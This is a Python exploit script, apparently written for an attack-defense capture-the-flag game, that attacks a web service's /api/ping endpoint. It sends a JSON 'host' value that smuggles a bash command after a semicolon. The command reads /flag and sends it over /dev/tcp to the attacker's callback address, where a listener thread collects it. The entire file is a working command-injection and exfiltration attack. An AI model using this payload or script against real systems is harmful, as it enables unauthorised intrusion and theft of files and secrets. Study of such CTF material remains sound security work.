#!/usr/bin/env python3

import os
import re
import socket
import sys
import threading

import httpx

from lib import get_target

FLAG_RE = re.compile(rb"FLAG\{[^\n\r}]*\}")
CALLBACK_PORT = 31458


def _guess_callback_ip(target_host: str, target_port: int) -> str:
    def local_ip_to(host: str, port: int) -> str:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((host, port))
            return sock.getsockname()[0]
        finally:
            sock.close()

    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        target_ip = target_host

    ip = local_ip_to(target_ip, target_port)
    if ip.startswith("127."):
        ip2 = local_ip_to("1.1.1.1", 53)
        if not ip2.startswith("127."):
            ip = ip2
    return ip


def _handle_exfil(conn: socket.socket) -> int:
    transcript = b""
    conn.settimeout(2.0)
    while True:
        chunk = conn.recv(65536)
        if not chunk:
            break
        transcript += chunk
        if FLAG_RE.search(transcript):
            break

    m = FLAG_RE.search(transcript)
    if m:
        sys.stdout.buffer.write(m.group(0) + b"\n")
        sys.stdout.buffer.flush()
        return 0

    sys.stdout.buffer.write(transcript + (b"\n" if not transcript.endswith(b"\n") else b""))
    sys.stdout.buffer.flush()
    return 1


class ListenerThread(threading.Thread):
    def __init__(
        self,
        listener: socket.socket,
        timeout_s: float = 8.0,
        timeout_message: str = "target did not connect back (is the attacker reachable?)",
    ) -> None:
        super().__init__()
        self._listener = listener
        self._timeout_s = timeout_s
        self._timeout_message = timeout_message
        self.exit_code = 1

    def run(self) -> None:
        self._listener.settimeout(self._timeout_s)
        try:
            conn, _addr = self._listener.accept()
        except OSError:
            return
        except socket.timeout:
            print(f"[!] {self._timeout_message}", file=sys.stderr)
            return
        finally:
            try:
                self._listener.close()
            except Exception:
                pass

        try:
            self.exit_code = _handle_exfil(conn)
        except Exception as exc:
            print(f"[!] listener failed: {exc}", file=sys.stderr)
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def stop(self) -> None:
        try:
            self._listener.close()
        except Exception:
            pass


def _ensure_single_use(path: str = "/tmp/used") -> bool:
    if os.path.exists(path):
        return False
    with open(path, "w") as handle:
        handle.write(str(os.getpid()))
        handle.flush()
    return True


def main() -> int:
    if not _ensure_single_use():
        print("[!] already used; skipping", file=sys.stderr)
        return 0

    target_host, target_port, _team_id = get_target(sys.argv)

    callback_ip = _guess_callback_ip(target_host, target_port)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind(("0.0.0.0", CALLBACK_PORT))
    except OSError as exc:
        print(f"[!] failed to bind callback port {CALLBACK_PORT}: {exc}", file=sys.stderr)
        return 1
    listener.listen(1)

    listener_thread = ListenerThread(listener)
    listener_thread.start()

    payload = (
        "127.0.0.1;"
        "bash -c '"
        'H=$(ip route 2>/dev/null | awk "/default/ {print \\$3; exit}"); '
        f'[ -z "$H" ] && H={callback_ip}; '
        f"cat /flag > /dev/tcp/$H/{CALLBACK_PORT}"
        "' "
        "> /dev/null 2>&1 #"
    )

    base = f"http://{target_host}:{target_port}"
    try:
        with httpx.Client(timeout=5.0) as client:
            client.post(f"{base}/api/ping", json={"host": payload})
    except Exception as exc:
        print(f"[!] exploit request failed: {exc}", file=sys.stderr)
        listener_thread.stop()
        listener_thread.join()
        return 1

    listener_thread.join()
    return listener_thread.exit_code


if __name__ == "__main__":
    raise SystemExit(main())
